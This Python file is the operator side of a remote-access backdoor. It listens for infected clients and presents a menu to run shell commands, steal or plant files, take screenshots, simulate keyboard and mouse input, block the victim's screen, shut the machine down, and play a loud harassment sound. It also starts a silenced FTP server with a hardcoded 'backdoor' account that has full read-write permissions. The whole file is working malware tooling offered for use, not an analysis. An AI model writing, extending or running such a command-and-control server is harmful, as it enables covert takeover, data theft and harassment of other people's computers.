import socket
import os
import sys
import time
import multiprocessing
import threading
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

ActiveClient = None
PreviousClient = None
isPreviousClient = False
ClientCounter = 0
#-------------------------------------------------------------------------------------------------------------------------------------------------------------
def setup_users(authorizer):
	authorizer.add_user("backdoor", "backdoor", "*whatever location you want*", perm="elradfmw")
	
def create_ftp_server():
	# Create a DummyAuthorizer with no anonymous user allowed
	authorizer = DummyAuthorizer()
	setup_users(authorizer)

	# Create the FTP handler and pass it the authorizer
	handler = FTPHandler
	handler.authorizer = authorizer

	# Create the FTP server and define the address and port
	server = FTPServer(("ipv6", 21), handler)
	return server
	
def run_ftp_server():
	sys.stdout = open(os.devnull, "w")
	sys.stderr = open(os.devnull, "w")
	ftp_server = create_ftp_server()
	ftp_server.serve_forever()

#-------------------------------------------------------------------------------------------------------------------------------------------------------------
def PrintSelections():
	os.system('clear')
	print(f"""
 
Currently connected to {ActiveClient}
	
[*]   clear												[Clears the active shell]
[0]   exit												[Stops the active backdoor]
[1]   shutdown												[Shuts down the active remote host]
[2]   cmd:{your command}										[Runs cmd command on remote host]
[3]   take:{remote host file path}									[Takes a file from remote host at specified path] 
[4]   send:{file name},{remote path|no file name| \ at end}						[Sends a file to the remote host at specified path]
[5]   keyboard:{text to simulate}									[Simulates text from remote host's keyboard]
[6]   mouse:{up/down, left/right/left/right click, scroll up/down, scroll left/right, sleep}		[Simulates the mouse from remote host's mouse]
[7]   screenblock:{enable, disable}									[Blocks the screen of the remote host]
[8]   screenshot											[Takes a screen shot of all screens on remote host]
[9]   dropbomb												[Sets the users volume to max and plays a bomb sound]
[10]  screenfuck
	""")

def SendData(selection, client_socket):
	data = selection.encode()
	client_socket.sendall(data)
	client_socket.settimeout(5)
	data2 = client_socket.recv(500000)
	client_socket.settimeout(None)
	return data2
	
def SelectionMenu(client_socket, server_socket):
	PrintSelections()
	BreakLoop = False
	
	while BreakLoop == False:
		selection = input('Selection: ')
		
		try:
			if (selection == 'clear'):
				PrintSelections()
				
			elif (selection == 'exit'):
				#server_socket.close()
				print('Stopping backdoor connection and quitting...')
				BreakLoop = True
				break
				
			elif (selection.startswith('cmd:')):
				print(SendData(selection, client_socket).decode())
				
			elif (selection.startswith('take:')):
				print(SendData(selection, client_socket).decode())
			
			elif (selection.startswith('send:')):
				print(SendData(selection, client_socket).decode())
				
			elif (selection.startswith('keyboard:')):
				print(SendData(selection, client_socket).decode())
				
			elif (selection.startswith('mouse:')):
				print(SendData(selection, client_socket).decode())
				
			elif (selection.startswith('screenblock:')):
				print(SendData(selection, client_socket).decode())
				
			elif (selection.startswith('shutdown')):
				print(SendData(selection, client_socket).decode())
				
			elif (selection.startswith('screenshot')):
				print(SendData(selection, client_socket).decode())
				
			elif (selection.startswith('dropbomb')):
				print(SendData(selection, client_socket).decode())
				
			elif (selection.startswith('screenfuck')):
				print(SendData(selection, client_socket).decode())
				
			else:
				print("Invalid Selection. Please select again")
			
		except Exception as e:
			print(f"Response from client: {e}")
			

def show_client_menu():
	global isPreviousClient
	global ActiveClient
	global PreviousClient
	
	os.system('clear')
	
	if isPreviousClient == True:
		print(f'Previous Client:\n{PreviousClient}\n\n')
		
	print("--- Pending Backdoor Client ---")
	selection = input(f"""
[Pending Client] {ActiveClient}

Options:
[*] Stop Listening
[1] Accept Connection
[2] Decline connection and accept new connection

Selection: """)
	return selection
	

def main():
	global ClientCounter
	global ActiveClient
	global PreviousClient
	global isPreviousClient
	
	server_socket = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
	server_socket.bind(('ipv6', 1117))
	server_socket.listen(5)

	print("Server listening on [ipv6]:1117")

	while True:
		if ClientCounter > 0:
			PreviousClient = ActiveClient
			isPreviousClient = True
					
		client_socket, client_address = server_socket.accept()
		print(f"Received connection request from {client_address}")
		ActiveClient = client_address
		
		# Display the menu and send data to the selected client
		while True:
			selected_client_ip = show_client_menu()
			
			if selected_client_ip == "*":
				print("Stopping the listener...")
				client_socket.close()
				break
			
			if selected_client_ip == "1":
				ClientCounter += 1
				SelectionMenu(client_socket, server_socket)
				client_socket.close()
				break

			if selected_client_ip == "2":
				ClientCounter += 1
				client_socket.close()
				break

if __name__ == "__main__":
	ftp_process = multiprocessing.Process(target=run_ftp_server)
	ftp_process.daemon = True
	ftp_process.start()
	main()
